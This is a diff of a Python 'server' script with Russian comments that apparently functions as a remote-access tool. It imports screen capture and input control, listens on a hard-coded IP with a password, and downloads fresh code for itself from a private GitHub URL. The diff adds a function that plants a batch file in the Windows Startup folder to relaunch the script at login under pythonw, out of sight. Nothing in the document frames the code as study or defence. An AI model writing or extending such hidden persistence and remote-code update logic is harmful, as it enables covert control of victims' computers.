@@ -11,17 +11,15 @@ from PIL import ImageGrab
 import pyautogui
 
 # Настройки сервера
-HOST = '25.33.76.33'     # IP-адрес сервера
-PORT = 5000               # Порт
+HOST = '25.33.76.33'  # IP-адрес сервера
+PORT = 5000         # Порт
 PASSWORD = 'StrongPassword123'
 
-# URL для автообновления (raw-ссылка на server.py)
-UPDATE_URL = (
-    'https://raw.githubusercontent.com/Dimonlomon/Private/main/server.py'
-)
-CHECK_INTERVAL = 300  # проверка каждые 300 секунд
+# URL для автообновления
+UPDATE_URL = 'https://raw.githubusercontent.com/Dimonlomon/Private/main/server.py'
+CHECK_INTERVAL = 300  # Проверка каждые 300 секунд
 
-# --- Отправка/приём данных с префиксом длины ---
+# --- Отправка/приём данных ---
 def send_data(conn, data: bytes):
     conn.sendall(struct.pack('>I', len(data)))
     conn.sendall(data)
@@ -39,7 +37,7 @@ def recv_data(conn) -> bytes:
         data += packet
     return data
 
-# Функция автообновления
+# --- Автообновление ---
 def auto_update():
     while True:
         try:
@@ -56,8 +54,8 @@ def auto_update():
                     os.replace(local_path, backup)
                     with open(local_path, 'w', encoding='utf-8') as f:
                         f.write(remote_code)
-                    print('[*] Restarting server...')
-                    os.execv(sys.executable, [sys.executable, local_path])
+                    print('[*] Updated. Restart manually.')
+                    return  # Не перезапускаем автоматически
                 else:
                     print('[*] Already up-to-date.')
             else:
@@ -66,7 +64,30 @@ def auto_update():
             print(f'[!] Auto-update error: {e}')
         time.sleep(CHECK_INTERVAL)
 
-# Обработчик клиента
+# --- Автозапуск ---
+def setup_autostart():
+    if os.name != 'nt':
+        return  # Только Windows
+
+    appdata = os.environ.get('APPDATA')
+    if not appdata:
+        print('[!] APPDATA переменная не найдена. Автозапуск не создан.')
+        return
+
+    startup_path = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+    bat_path = os.path.join(startup_path, 'server_start.bat')
+    pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
+    script_path = os.path.realpath(__file__)
+
+    if not os.path.exists(bat_path):
+        try:
+            with open(bat_path, 'w') as f:
+                f.write(f'@echo off\n"{pythonw}" "{script_path}"\n')
+            print(f'[*] Autostart created at: {bat_path}')
+        except Exception as e:
+            print(f'[!] Failed to create autostart: {e}')
+
+# --- Клиентский обработчик ---
 def handle_client(conn, addr):
     print(f'[+] Connected by {addr}')
     try:
@@ -141,18 +162,10 @@ def handle_client(conn, addr):
     finally:
         conn.close()
         print(f'[-] Disconnected {addr}')
-        
-with open("server.py", "r", encoding="utf-8") as f:
-    lines = f.readlines()
 
-# Убираем пустые строки и двойные переносы
-with open("server_cleaned.py", "w", encoding="utf-8") as f:
-    for line in lines:
-        if line.strip() != "":
-            f.write(line)
-# Запуск сервера
+# --- Запуск сервера ---
 def start_server():
-    # Запускаем автообновление в фоне
+    setup_autostart()
     threading.Thread(target=auto_update, daemon=True).start()
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -165,7 +178,3 @@ def start_server():
 
 if __name__ == '__main__':
     start_server()
-
-
-
-
